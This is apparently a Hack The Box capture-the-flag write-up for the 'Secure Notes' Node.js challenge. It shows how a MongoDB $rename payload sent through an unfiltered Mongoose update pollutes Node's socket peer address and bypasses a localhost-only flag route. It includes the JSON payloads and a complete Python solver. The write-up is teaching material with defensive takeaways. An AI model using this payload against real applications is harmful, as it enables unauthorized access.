---
layout: post
title: "Hack The Box - Secure Notes"
description: "Abusing an unfiltered Mongoose update to inject a MongoDB $rename operator, pollute Node's socket peer address, and bypass a localhost-only flag route."
date: 2026-06-07 10:00:43 +0700
categories: [writeup, ctf]
tags: [web, hackthebox, nodejs, express, mongoose, mongodb, nosql-injection, prototype-pollution]
ctf: "Hack The Box"
challenge: "Secure Notes"
category: "Web"
difficulty: "Medium"
points: 0
author: "gr3yr4t"
toc: true
comments: true
image: /assets/img/featured/secure-notes.svg
featured: true
---

## Challenge Description

Secure Notes is a small Node.js note-taking application. The application lets users create notes, view them, and update their title and content through a simple web interface.

From the source code, the backend is built with Express and uses MongoDB through Mongoose. At first glance, the application looks straightforward: there is a route to create notes, another one to update them, and a protected `/flag` route that only responds when the request appears to come from localhost.

The interesting part is how the application handles note updates. The update route passes user-controlled JSON directly into a Mongoose update call, which allows us to inject MongoDB update operators.

## TL;DR

1. `/flag` only returns the flag when `req.connection.remoteAddress` is localhost.
2. `/create` lets us create a note with attacker-controlled `title` and `content`.
3. `/update` passes the full request body directly into `Note.findByIdAndUpdate()`.
4. Since update operators are not filtered, we can inject a raw MongoDB `$rename` operator.
5. `$rename` moves the `title` value into `__proto__._peername.address`, causing prototype pollution.
6. After the pollution, `/flag` reads the forged peer address and returns the flag.

## Initial Analysis

The backend is very small. It connects to MongoDB, defines a `Note` model, serves static files, and exposes a few routes:

```js
app.get('/flag', ...);
app.post('/create', ...);
app.get('/get/:noteId', ...);
app.post('/update', ...);
````

The note schema only contains two fields:

```js
const Note = mongoose.model('Note', new mongoose.Schema({
    title: String,
    content: String,
}));
```

The `/flag` route immediately looks interesting because it uses the request socket address as an authorization check. If the request comes from localhost, the route returns the flag. Otherwise, it returns `403`.

There is no obvious SSRF feature in the application, so the question becomes:

> Can we somehow influence what Node thinks the client address is?

## Reading the Source

The `/flag` route checks `req.connection.remoteAddress`:

```js
app.get('/flag', (req, res) => {
    const remoteAddress = req.connection.remoteAddress;
    if (remoteAddress === '127.0.0.1' || remoteAddress === '::1' || remoteAddress === '::ffff:127.0.0.1') {
        res.send(process.env.FLAG ?? 'HTB{redacted}');
    } else {
        res.status(403).json({ Message: 'Access denied' });
    }
});
```

The `/create` route validates that both `title` and `content` are strings before saving the note:

```js
app.post('/create', async (req, res) => {
    const { title, content } = req.body;
    if (typeof title !== 'string' || typeof content !== 'string') {
        res.status(400).json({ Message: 'Invalid title or content' });
        return;
    }

    const note = new Note({
        title,
        content,
    });

    await note.save();
    res.json(note);
});
```

So far, nothing too suspicious.

The vulnerable route is `/update`:

```js
app.post('/update', async (req, res) => {
    try {
        const { noteId } = req.body;
        await Note.findByIdAndUpdate(noteId, req.body);
        let result = await Note.find({ _id: noteId });
        res.json(result);
    } catch (error) {
        console.error(error);
        res.status(500).json({ Message: "An error occurred" });
    }
});
```

The intended request body probably looks like this:

```json
{
  "noteId": "...",
  "title": "new title",
  "content": "new content"
}
```

However, the application never restricts the update body to only `title` and `content`. Whatever JSON we send is passed directly to `findByIdAndUpdate()`.

## Vulnerability Analysis

The bug is caused by passing the entire request body directly into a MongoDB update operation.

MongoDB update objects are not always plain data. They can also contain update operators such as `$set`, `$unset`, and `$rename`.

The vulnerable data flow looks like this:

```text
HTTP JSON body
  -> express.json()
  -> req.body
  -> Note.findByIdAndUpdate(noteId, req.body)
  -> MongoDB/Mongoose update operation
```

Because the user controls the update object, we can inject the `$rename` operator:

```json
{
  "noteId": "...",
  "$rename": {
    "title": "__proto__._peername.address"
  }
}
```

Before sending that update, we create a note with this title:

```text
127.0.0.1
```

Then the `$rename` operation moves the `title` value into this path:

```text
__proto__._peername.address = "127.0.0.1"
```

This pollutes the prototype path used by the socket peer-name information. After that, when `/flag` checks `req.connection.remoteAddress`, it resolves to the polluted localhost value.

So the bypass is not about actually making a request from localhost. Instead, we corrupt the object state that the localhost check depends on.

## Failed Attempts

The first obvious test is requesting `/flag` directly:

```http
GET /flag
```

This fails with `403`, because our real remote address is not localhost.

A normal note update also does not help:

```json
{
  "noteId": "...",
  "title": "127.0.0.1",
  "content": "pwned"
}
```

This only changes the stored note fields. It does not affect the socket address used by the `/flag` route.

The important realization is that `/update` is not limited to normal fields. Since raw MongoDB operators are allowed, we can use the update route to write into dangerous object paths.

## Exploitation

The exploit only needs three steps.

First, create a note whose `title` contains the address we want the server to see:

```json
{
  "title": "127.0.0.1",
  "content": "pwned"
}
```

The server returns the created note, including its `_id`.

Next, send a malicious update using `$rename`:

```json
{
  "noteId": "<note id>",
  "$rename": {
    "title": "__proto__._peername.address"
  }
}
```

This renames the `title` field into a prototype pollution path.

Finally, request the protected route:

```http
GET /flag
```

After the pollution step, the localhost check succeeds and the application returns the flag.

## Exploit Flow Summary

```text
create note with title = 127.0.0.1
  -> send unfiltered $rename through /update
  -> rename title into __proto__._peername.address
  -> req.connection.remoteAddress resolves to the polluted value
  -> /flag localhost check passes
  -> flag is returned
```

## Solver

```python
#!/usr/bin/env python3
import sys
import requests


def main():
    target = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:1337"

    session = requests.Session()

    note = session.post(f"{target}/create", json={
        "title": "127.0.0.1",
        "content": "pwned"
    })
    note.raise_for_status()

    note_id = note.json()["_id"]

    pollution = session.post(f"{target}/update", json={
        "noteId": note_id,
        "$rename": {
            "title": "__proto__._peername.address"
        }
    })
    pollution.raise_for_status()

    flag = session.get(f"{target}/flag")
    flag.raise_for_status()

    print(flag.text)


if __name__ == "__main__":
    main()
```

Run it like this:

```bash
python3 solve.py http://127.0.0.1:1337
```

For the remote instance, replace the URL with the provided Hack The Box host and port.

## Flag

```text
HTB{redacted}
```

## Why This Bug Matters

This challenge is a good example of why user-controlled JSON should not be passed directly into database update APIs.

In MongoDB, an update object can contain operators, not only normal fields. If the application does not explicitly allowlist the fields that can be updated, user input can become database logic.

The localhost check is also fragile. Authorization based only on `remoteAddress` assumes that the runtime state is trustworthy. Once prototype pollution is possible, even internal-looking properties can become attacker-controlled.

## Takeaways

* Never pass an entire request body directly into a MongoDB update call.
* Allowlist updateable fields such as `title` and `content`.
* Reject keys starting with `$` in user-controlled objects unless explicitly required.
* Treat paths containing `__proto__`, `constructor`, or `prototype` as dangerous.
* Do not use localhost-only checks as a replacement for real authorization.
* Prototype pollution can turn a small update bug into control over runtime behavior.
